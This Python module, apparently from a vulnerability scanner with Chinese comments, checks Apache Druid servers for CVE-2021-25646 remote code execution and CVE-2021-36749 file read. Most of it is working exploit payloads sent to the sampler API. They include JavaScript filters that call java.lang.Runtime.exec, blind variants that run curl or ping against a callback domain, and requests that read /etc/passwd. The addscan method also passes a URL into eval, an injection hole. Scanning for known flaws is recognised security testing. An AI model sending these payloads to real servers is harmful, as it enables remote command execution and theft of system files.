#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Apache Druid 是一个集时间序列数据库、数据仓库和全文检索系统特点于一体的分析性数据平台 (不支持Windows平台)
    Apache Druid扫描类: 
        1. Apache Druid 远程代码执行
            CVE-2021-25646
                Payload: https://www.freebuf.com/vuls/263276.html
                         https://cloud.tencent.com/developer/article/1797515

        2. Apache Druid任意文件读取
            CVE-2021-36749
                Payload: https://cloud.tencent.com/developer/article/1942458

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
# from lib.tool import head
from payloads.ApacheDruid.cve_2021_25646 import cve_2021_25646_scan
from payloads.ApacheDruid.cve_2021_36749 import cve_2021_36749_scan

class ApacheDruid():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheDruid'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md
        
        self.random_num = random_int_1(6)
        
        cve_2021_25646_data = '''{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
"function":"function(value){return java.lang.Runtime.getRuntime().exec('COMMAND')}",
"dimension":"added",
"":{
"enabled":"true"
}
}}}},"samplerConfig":{"numRows":5,"cacheKey":"79a5be988bf94d42a6f219b63ff27383"}}'''

        self.cve_2021_25646_payloads = [
            # ! 回显POC
            {
                'path': 'druid/indexer/v1/sampler?for=filter',
                'data': '''{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema": {
      			"dataSource": "%%DATASOURCE%%",
      			"parser": {
      				"parseSpec": {
      					"format": "javascript",
      					"timestampSpec": {},
      					"dimensionsSpec": {},
      					"function": "function(){var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\"COMMAND\\").getInputStream()).useDelimiter(\\"\\\\A\\").next();return {timestamp:\\"2013-09-01T12:41:27Z\\",test: s}}",
      					"": {
      						"enabled": "true"
      					}
      				}
      			}
      		}
      	},
      	"samplerConfig": {
      		"numRows": 10
      	}
      }'''.replace('COMMAND', 'echo '+md5(str(self.random_num)))
            },
            # ! 无回显POC
            {
                'path': 'druid/indexer/v1/sampler?for=filter',
                'data': cve_2021_25646_data.replace('COMMAND', 'curl DNSDOMAIN')
            },
            {
                'path': 'druid/indexer/v1/sampler?for=filter',
                'data': cve_2021_25646_data.replace('COMMAND', 'curl http://DNSDOMAIN')
            },
            {
                'path': 'druid/indexer/v1/sampler?for=filter',
                'data': cve_2021_25646_data.replace('COMMAND', 'ping -c 4 DNSDOMAIN')
            },
            {
                'path': 'druid/indexer/v1/sampler?for=filter',
                'data': cve_2021_25646_data.replace('COMMAND', 'ping DNSDOMAIN')
            },
        ]

        self.cve_2021_36749_payloads = [
            {
                'path': 'druid/indexer/v1/sampler?for=connect',
                'data': '''{
        "type": "index",
        "spec": {
          "type": "index",
          "ioConfig": {
            "type": "index",
            "firehose": {
              "type": "http",
              "uris": ["file:///etc/passwd"]
            }
          },
          "dataSchema": {
            "dataSource": "sample",
            "parser": {
              "type": "string",
              "parseSpec": {
                "format": "regex",
                "pattern": "(.*)",
                "columns": ["a"],
                "dimensionsSpec": {},
                "timestampSpec": {
                  "column": "!!!_no_such_column_!!!",
                  "missingValue": "2010-01-01T00:00:00Z"
                }
              }
            }
          }
        },
        "samplerConfig": {
          "numRows": 500,
          "timeoutMs": 15000
        }
      }'''
            },
            {
                'path': 'druid/indexer/v1/sampler?for=connect',
                'data': '''{
  "type": "index",
  "spec": {
    "ioConfig": {
      "type": "index",
      "inputSource": {
        "type": "local",
        "baseDir": "/etc/",
        "filter": "passwd"
      },
      "inputFormat": {
        "type": "json",
        "keepNullColumns": true
      }
    },
    "dataSchema": {
      "dataSource": "sample",
      "timestampSpec": {
        "column": "timestamp",
        "format": "iso",
        "missingValue": "1970"
      },
      "dimensionsSpec": {}
    }
  },
  "type": "index",
  "tuningConfig": {
    "type": "index"
  }
},
  "samplerConfig": {
    "numRows": 500,
    "timeoutMs": 15000
  }
}'''
            },
            {
                'path': 'druid/indexer/v1/sampler?for=connect',
                'data': '''{
        "type": "index",
        "spec": {
          "ioConfig": {
            "type": "index",
            "firehose": {
              "type": "local",
              "baseDir": "/etc/",
              "filter": "passwd"
            }
          },
          "dataSchema": {
            "dataSource": "sample",
            "parser": {
              "parseSpec": {
                "format": "json",
                "timestampSpec": {},
                "dimensionsSpec": {}
              }
          }
        }
      },
        "samplerConfig": {
          "numRows": 500,
          "timeoutMs": 15000
        }
      }'''
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_25646_scan, url=url),
            thread(target=self.cve_2021_36749_scan, url=url),
        ]

ApacheDruid.cve_2021_25646_scan = cve_2021_25646_scan
ApacheDruid.cve_2021_36749_scan = cve_2021_36749_scan

apachedruid = ApacheDruid()
